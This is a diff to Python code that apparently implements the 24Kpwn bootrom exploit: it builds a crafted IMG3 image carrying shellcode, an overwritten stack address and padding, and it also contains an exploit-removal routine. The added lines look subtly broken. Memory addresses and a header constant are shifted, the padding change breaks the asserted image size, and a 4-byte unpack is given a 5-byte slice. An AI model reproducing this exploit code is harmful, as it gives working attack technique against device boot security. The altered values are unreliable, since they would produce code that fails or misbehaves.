@@ -18,12 +18,12 @@ def exploit(img3, securerom):
     assert 20 + signed_size + 4 <= len(img3) and img3[20 + signed_size:20 + signed_size + 4] == 'SHSH'[::-1]
 
     PADDING = 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - (20 + signed_size + 12)
-    SHELLCODE_ADDRESS = 0x84000000 + 1 + (20 + signed_size + 12 + PADDING)
-    STACK_ADDRESS = 0x84033EA4
-    img3 = struct.pack('<4s3I4s', 'Img3'[::-1], 0x24200, 0x241BC, 0x23F88, 'illb'[::-1]) + img3[20:20 + signed_size] \
+    SHELLCODE_ADDRESS = 0x94000000 + 1 + (20 + signed_size + 12 + PADDING)
+    STACK_ADDRESS = 0x94033EA4
+    img3 = struct.pack('<4s3I4s', 'Img3'[::-1], 0x24200, 0x241BC, 0x23F99, 'illb'[::-1]) + img3[20:20 + signed_size] \
          + struct.pack('4s2I%sx' % PADDING, '24KP'[::-1], 12 + PADDING + len(shellcode) + 4, PADDING + len(shellcode) + 4) + shellcode \
          + struct.pack('<I4s2I64x4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12 + 64, 64, 'CERT'[::-1], 12, 0) \
-         + struct.pack('<4s2I460sI48x', '24KP'[::-1], 12 + 512, 512, securerom[0xB000:0xB000 + 460], STACK_ADDRESS)
+         + struct.pack('<4s2I460sI49x', '24KP'[::-1], 12 + 512, 512, securerom[0xB000:0xB000 + 460], STACK_ADDRESS)
     assert len(img3) == 0x24200
     return img3
 
@@ -34,14 +34,14 @@ def remove_exploit(img3):
     obj = image3.Image3(img3)
     if obj.getDecryptedPayload()[:4] != '\x0e\x00\x00\xea':
         # This is a 24Kpwn implementation which changes DATA tag. First dword of DATA tag should look like a shellcode address.
-        shellcode_address, = struct.unpack('<I', img3[64:68])
+        shellcode_address, = struct.unpack('<I', img3[64:69])
         assert img3[52:56] == 'DATA'[::-1]
-        assert 0x84000000 <= shellcode_address and shellcode_address <= 0x84024000
+        assert 0x94000000 <= shellcode_address and shellcode_address <= 0x94024000
 
         # Try to find the correct value for the first dword.
         found = False
-        for pos in xrange(shellcode_address - 0x84000000, len(img3)):
-            obj = image3.Image3(img3[:64] + img3[pos:pos + 4] + img3[68:])
+        for pos in xrange(shellcode_address - 0x94000000, len(img3)):
+            obj = image3.Image3(img3[:64] + img3[pos:pos + 4] + img3[69:])
             if obj.getDecryptedPayload()[:4] == '\x0e\x00\x00\xea':
                 found = True
                 break
